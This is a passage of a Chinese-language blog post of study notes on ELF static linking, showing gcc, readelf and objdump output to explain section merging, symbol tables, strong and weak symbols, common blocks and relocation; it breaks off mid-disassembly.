class="line">b.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">ab:  ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure><p>把canary关了，不然链接是找不到__stack_chk_fail，因为我们并没有ld标准链接库，</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32  -c a.c b.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function ‘swap’ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-stack-protector -c a.c b.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function ‘swap’ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>ld时-e指定下入口为mian，不然ld时找不到默认的_start</p><p>gcc11.3还需要-fno-pie把pie关了,不然他的重定位类型似乎是按照共享库来的，我们先搞静态，gcc5加不加都行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S a.o</span><br><span class="line">There are <span class="number">12</span> section headers, starting at offset <span class="number">0x220</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">0001b</span>0 <span class="number">000010</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a3 <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a4 <span class="number">000044</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">0001</span>c0 <span class="number">000008</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">9</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>c8 <span class="number">000057</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">10</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e8</span> <span class="number">0000b</span>0 <span class="number">10</span>     <span class="number">11</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">11</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000016</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S b.o</span><br><span class="line">There are <span class="number">11</span> section headers, starting at offset <span class="number">0x1f4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000070</span> <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>aa <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>ac <span class="number">000038</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000008</span> <span class="number">08</span>   I  <span class="number">9</span>   <span class="number">6</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>a0 <span class="number">000053</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">9</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e4</span> <span class="number">0000</span>a0 <span class="number">10</span>     <span class="number">10</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">10</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000184</span> <span class="number">000011</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S ab</span><br><span class="line">There are <span class="number">8</span> section headers, starting at offset <span class="number">0x2e4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">08048094</span> <span class="number">000094</span> <span class="number">000072</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .eh_frame         PROGBITS        <span class="number">08048108</span> <span class="number">000108</span> <span class="number">000064</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">0804916</span>c <span class="number">00016</span>c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000170</span> <span class="number">000035</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0002</span>aa <span class="number">00003</span>a <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0001</span>a8 <span class="number">0000</span>d0 <span class="number">10</span>      <span class="number">7</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000278</span> <span class="number">000032</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="空间与地址分配"><a href="#空间与地址分配" class="headerlink" title="空间与地址分配"></a>空间与地址分配</h4><p>linker把所有的输入目标文件相同的节合并成一个，从大小也可以看出来是合并了，然后重新生成一个elf header来帮助我们加载时找到新段</p><h4 id="符号解析与重定位"><a href="#符号解析与重定位" class="headerlink" title="符号解析与重定位"></a>符号解析与重定位</h4><p>链接的本质就是把不同目标文件粘在一起，符号是粘合剂，符号包括变量名，函数名，还有段名等等，符号标记了各种信息，他被存储在我们的.symtab section标志的符号表里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p><strong>st_name</strong></p><p>在.strtab 字符串表里的下标</p><p><strong>st_shndx</strong></p><ul><li>符号定义在本文件<ul><li>符号所在段下标</li></ul></li><li>不在本文文件或者某些特殊值<ul><li>SHN_ABS 表示该符号包含一个绝对的值</li><li>SHN_COMMON 表示该符号是一个COMMON块类型的符号</li><li>SHN_UNDEF 表示该符号未定义</li></ul></li></ul><p><strong>st_info</strong></p><p>符号的类型和绑定信息</p><p>绑定信息</p><ul><li>STB_LOCAL局部符号</li><li>STB_GLOBAL全局符号</li><li>STB_WEAK弱符号</li></ul><p>符号类型</p><ul><li>STT_NOTYPE 未知</li><li>STT_OBJECT 数据对象，比如变量</li><li>STT_FUNC 函数或可执行代码 </li><li>STT_SECTION 表示一个段</li><li>STT_FILE表示文件名 st_shndx一定是SHN_ABS</li></ul><p><strong>st_size</strong></p><p>符号大小，对于包含数据的符号，这个值是数据类型的大小，比如我们上面a.o的main就是main函数的大小，0x39&#x3D;57,int 类型的shared大小为4</p><p><strong>st_value</strong></p><ul><li>在可重定位目标文件里函数或变量符号<ul><li>符号类型不在common块里，则表示符号在段里的偏移</li><li>在common块里，则表示符号对齐属性</li></ul></li><li>可执行目标文件里<ul><li>表示符号的虚拟地址</li></ul></li></ul><p><strong>st_other</strong>暂时没用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -s a.o b.o ab</span><br><span class="line"></span><br><span class="line">File: a.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 11 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    7</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     8: 00000000    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">     9: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND shared</span><br><span class="line">    10: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line"></span><br><span class="line">File: b.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 10 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    5</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    6</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     8: 00000000     4 OBJECT  GLOBAL DEFAULT    2 shared</span><br><span class="line">     9: 00000000    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line"></span><br><span class="line">File: ab</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 13 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048094     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048108     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 0804916c     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 00000000     0 FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     6: 00000000     0 FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     7: 080480cd    57 FUNC    GLOBAL DEFAULT    1 swap</span><br><span class="line">     8: 0804916c     4 OBJECT  GLOBAL DEFAULT    3 shared</span><br><span class="line">     9: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 __bss_start</span><br><span class="line">    10: 08048094    57 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    11: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _edata</span><br><span class="line">    12: 08049170     0 NOTYPE  GLOBAL DEFAULT    3 _end</span><br></pre></td></tr></table></figure><p>为什么有些名字显示?</p><p>可以看的没显示的类型都为STT_SECTION他们的名字其实就是st_shndx代表的段的段名字</p><p>readelf没有显示，objdump给显示出来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; objdump -t a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">SYMBOL TABLE:</span><br><span class="line"><span class="number">00000000</span> l    df *ABS*  <span class="number">00000000</span> a.c</span><br><span class="line"><span class="number">00000000</span> l    d  .text  <span class="number">00000000</span> .text</span><br><span class="line"><span class="number">00000000</span> l    d  .data  <span class="number">00000000</span> .data</span><br><span class="line"><span class="number">00000000</span> l    d  .bss   <span class="number">00000000</span> .bss</span><br><span class="line"><span class="number">00000000</span> l    d  .note.GNU-<span class="built_in">stack</span>        <span class="number">00000000</span> .note.GNU-<span class="built_in">stack</span></span><br><span class="line"><span class="number">00000000</span> l    d  .eh_frame      <span class="number">00000000</span> .eh_frame</span><br><span class="line"><span class="number">00000000</span> l    d  .comment       <span class="number">00000000</span> .comment</span><br><span class="line"><span class="number">00000000</span> g     F .text  <span class="number">00000039</span> main</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> shared</span><br><span class="line"><span class="number">00000000</span>         *UND*  <span class="number">00000000</span> swap</span><br></pre></td></tr></table></figure><h5 id="什么是common块-amp-amp-强符号弱符号-amp-amp-弱引用强引用"><a href="#什么是common块-amp-amp-强符号弱符号-amp-amp-弱引用强引用" class="headerlink" title="什么是common块&amp;&amp;强符号弱符号&amp;&amp;弱引用强引用"></a>什么是common块&amp;&amp;强符号弱符号&amp;&amp;弱引用强引用</h5><p>我们用前面的simple section.c来说</p><p>.bss段存放未初始化的全局变量和局部静态变量(这里编译器其实为了节约磁盘空间把初始化为0的变量也放入了bss)，但是global_uninit_var却在COM块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name  </span><br><span class="line"><span class="number">14</span>: <span class="number">00000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM global_uninit_var</span><br></pre></td></tr></table></figure><p>也就是说gcc把没有初始化的全局变量放到了COMMON块 当然gcc5也可以通过 -fno-common或者用__attribute__((nocommon))取消掉这个机制，这样多重定义的全局符号时，会触发一个错误</p><p>这个我在gcc11试了试发现好像默认没有放到common，而是都放到了bss</p><p>这种未初始化全局变量的符号叫做弱符号，相反的就叫做强符号</p><ul><li>不允许一个强符号被多次定义，否则链接器会报错</li><li>如果一个符号在某个目标文件中是强符号，链接时选强符号</li><li>一个符号在所有可重定位文件里都是弱符号，选字节最大的</li></ul><p>所以我们下面这样会自动选择强符号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">double</span> d = <span class="number">666666</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f,%d&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这样搞是不会报错的(实际上我在gcc11上报了multiple definition of d的错了，因为他默认不用common，可以通过-fcommon启用这个机制,之后也没有报错)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">0x804a020</span></span><br><span class="line"><span class="number">666666.500000</span>,<span class="number">200</span>⏎</span><br></pre></td></tr></table></figure><p>当然我们的弱符号的字节大小是不能大于强符号的否则在ld链接过程有一个warning</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> d = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> p= <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    p1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x,%x&quot;</span>,d,p);</span><br><span class="line">&#125;</span><br><span class="line">p1.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> d;</span><br><span class="line"><span class="type">void</span> <span class="title function_">p1</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;d);</span><br><span class="line">    d =<span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; gcc -m32  test.c p1.c</span><br><span class="line">/usr/bin/ld: Warning: alignment <span class="number">4</span> of symbol `d<span class="number">&#x27;</span> in /tmp/ccEf1boS.o is smaller than <span class="number">8</span> in /tmp/cc2ZKeXO.o</span><br><span class="line">grxer@Ubuntu16 /m/h/S/NEMU&gt; ./a.out</span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0x804a01c</span></span><br><span class="line"><span class="number">0</span>,<span class="number">3f</span>f00000</span><br></pre></td></tr></table></figure><p>gcc提供给我们__attribute__((weak))来来定义任何一个符号为弱符号。</p><p><em>_attribute</em>_((weak)) double d这样就消除了这条warning</p><p><strong>但是这个输出显然是有问题的，d和p都变得奇怪起来</strong></p><p><strong>这个就是链接造成的，p1.c编译成一个可重定位模块时，他根本不会知道自己以后会干什么，在他眼里double d就是全部，所以他对d的赋值完全是按照double来的</strong></p><p><strong>但是到了链接的时候，对d的赋值是对test.c的int d强符号，用给double赋值的code对int 赋值</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048460 &lt;p1&gt;:</span><br><span class="line">8048460:       55                      push   %ebp</span><br><span class="line">8048461:       89 e5                   mov    %esp,%ebp</span><br><span class="line">8048463:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048466:       83 ec 08                sub    $0x8,%esp</span><br><span class="line">8048469:       68 1c a0 04 08          push   $0x804a01c</span><br><span class="line">804846e:       68 1a 85 04 08          push   $0x804851a</span><br><span class="line">8048473:       e8 68 fe ff ff          call   80482e0 &lt;printf@plt&gt;</span><br><span class="line">8048478:       83 c4 10                add    $0x10,%esp</span><br><span class="line">804847b:       d9 e8                   fld1</span><br><span class="line">804847d:       dd 1d 1c a0 04 08       fstpl  0x804a01c</span><br><span class="line">8048483:       90                      nop</span><br><span class="line">8048484:       c9                      leave</span><br><span class="line">8048485:       c3                      ret</span><br></pre></td></tr></table></figure><p>fld1把1这个浮点常数压倒x87栈的st0，fstpl再把他取出来放到&amp;d</p><p>double的1就是 3FF0000000000000</p><p><img src="/2023/04/28/static-link/image-20230429234155494.png" alt="image-20230429234155494"></p><p>这种bug如果在一个大型项目里找起来，那真的是栓q，所以extern很有必要</p><p>与之对应的还有强引用和弱引用 <em>_attribute</em>_ (weakref)来修饰</p><p>弱引用可以在找不到定义的时候链接成功，但是在执行时他的值为0</p><p>这类强弱机制存在的意义是在库里实现一些非常规的自定义操作</p><p>符号问题还有c++的符号修饰，c++的函数重载名称空间等依靠这个机制,c++filt可以帮我们解析这些修饰过的符号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/NEMU&gt; c++filt _ZN3foo3barE</span><br><span class="line">foo::bar</span><br></pre></td></tr></table></figure><p>为了和c兼容可以用extern “c” int x; extern ”c” { intx ;inty} 来不修饰符号</p><p>一些c里函数为了在c++不被当初c++函数修饰导致无法使用,头文件里采用了#ifdef宏来处理</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> “c” &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *,<span class="type">int</span>,<span class="type">size_t</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>说了这么多关于符号的东西，看看符号地址是怎么确定的，符号是怎么解析的</p><p><strong>符号地址</strong></p><p>符号在各个段里的偏移是确定的，我们linker把各个段拼接并分配虚拟地址，段基址我们自然知道，再加上原本的偏移就可以确定了</p><p><strong>符合解析</strong></p><p>链接器维护了三个集合E U D</p><ul><li>E 将被合并组成可执行文件的可重定位文件集合</li><li>U 当前引用但未解析的符合集合</li><li>D 当前所有定义符号的集合</li></ul><p>会从左到右扫描命令行出现的可重定位目标文件和静态库文件</p><p>当扫描到可重定位目标文件时 把它定义的符号加入D集合，引用单未定义的加入U</p><p>扫描到静态链接库时，依次检测库里的目标文件是不是包含U里面的未定义符号，包含则把这个符号从U里拿出来放入D，并把这个目标文件加入E，不包含直接丢弃该目标文件</p><p>扫描完全部时U是非空，链接器会报错终止，否则就开始合并E集合里的文件</p><p>这也就要求了我们静态链接时库的顺序问题，一定库放到最后，库之间如果有引用，还要调整一下顺序</p><h4 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h4><p>a.c中引用的 share和swap在编译器编译时是不确定的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter4&gt; objdump -dS a.o</span><br><span class="line"></span><br><span class="line">a.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;main&gt;:</span><br><span class="line">extern int shared;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   0:   8d 4c 24 04             lea    0x4(%esp),%ecx</span><br><span class="line">   4:   83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">   7:   ff 71 fc                pushl  -0x4(%ecx)</span><br><span class="line">   a:   55                      push   %ebp</span><br><span class="line">   b:   89 e5                   mov    %esp,%ebp</span><br><span class="line">   d:   51                      push   %ecx</span><br><span class="line">   e:   83 ec 14                sub    $0x14,%esp</span><br><span class="line">    int a = 6;</span><br><span class="line">  11:   c7 45 f4 06 00 00 00    movl   $0x6,-0xc(%ebp)</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">  18:   83 ec 08                sub    $0x8,%esp</span><br><span class="line">  1b:   68 00 00 00 00          push   $0x0</span><br><span class="line">  20:   8d 45 f4                lea    -0xc(%ebp),%eax</span><br><span class="line">  23:   50                      push   %eax</span><br><span class="line">  24:   e8 fc ff ff ff          call   25 &lt;main+0x25&gt;</span><br><span class="line">  29:   83 c4 10                add    $0x10,%esp</span><br><span class="line">  2c:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">&#125;</span><br><span class="line">  31:   8b 4d fc                mov    -0x4(%ebp),%ecx</span><br><span class="line">  34:   c9                      leave</span><br><span class="line">  35:   8d 61 